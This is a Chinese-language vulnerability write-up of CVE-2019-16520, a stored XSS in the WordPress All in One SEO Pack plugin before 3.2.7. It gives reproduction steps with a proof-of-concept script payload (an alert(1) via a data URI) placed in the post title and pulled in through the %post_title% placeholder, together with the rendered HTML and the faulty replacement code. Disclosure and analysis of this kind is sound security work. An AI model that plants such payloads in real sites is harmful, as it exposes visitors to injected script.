---
title: "（CVE-2019-16520）WordPress Plugin - All in One SEO Pack 储存型xss"
id: zhfly3251
---

# （CVE-2019-16520）WordPress Plugin - All in One SEO Pack 储存型xss

## 一、漏洞简介

适用于WordPress的3.2.7之前的“all-in-one-seo-pack plugin”插件（aka All in One SEO Pack）易受存储XSS的影响，原因是该插件通过不安全的占位符替换提供的帖子的SEO特定描述的编码不正确。

## 二、漏洞影响

wordpress <= 3.2.6

## 三、复现过程

### 1、利用过程

创建或编辑帖子时，可以设置以下值来显示漏洞：

```
title: "test_aiosp_title&<>"';><script src='data:text/javascript,alert(1)'></script>a"
Description: test_aiosp_desc&<>"'; pt:%post_title% wp_title:%wp_title% bd:%blog_description% sd:%site_description% bt: %blog_title% st: %site_title% desc:%description% 
```

当帖子被保存并以后访问时，将显示JavaScript警报弹出窗口。生成的HTML页面将包含以下代码

```
<title>test_aiosp_title&amp;&lt;&gt;&quot;&#039;;&lt;script src=&#039;data:text/javascript,alert(1)&#039;&gt;&lt;/script&gt; | XXXXXXX</title>

<!-- All in One SEO Pack 3.2.5 by Michael Torbert of Semper Fi Web Design[197,235] -->

<meta name=“description”  content=“test_aiosp_desc&amp;&quot;&#039;; pt:test_aiosp_title&<>”’;<script src=‘data:text/javascript,alert(1)’></script> wp_title:test_aiosp bd: sd: bt: XXXXXXX st: XXXXXXX desc:%description%" /> 
```

### 2、详细分析

该插件将几个字段添加到可以创建或编辑帖子的页面上。这样可以为每个帖子设置自定义标题和描述。此处提供的信息将插入meta到帖子页面上的相应-tags中。在将字段的值插入页面的HTML中之前，先对这些字段的值进行转义。

但是，在描述字段中，可以插入占位符，这些占位符在输出前已被某些值替换。也可以为前面提到的标题字段设置一个占位符。相关代码可以在 aioseop_class.php第4546-4548行中找到：

```
if ( false !== strpos( $description, '%post_title%', 0 ) ) {
    $description = str_replace( '%post_title%', $this->get_aioseop_title( $post, false ), $description );
} 
```

当攻击者在标题字段中设置有效负载并在描述字段中为标题字段的值提供占位符时，标题字段的原始值将被插入描述中。此后该描述未经过清理或编码。这使攻击者可以突破meta-tag属性并插入任意HTML和JavaScript。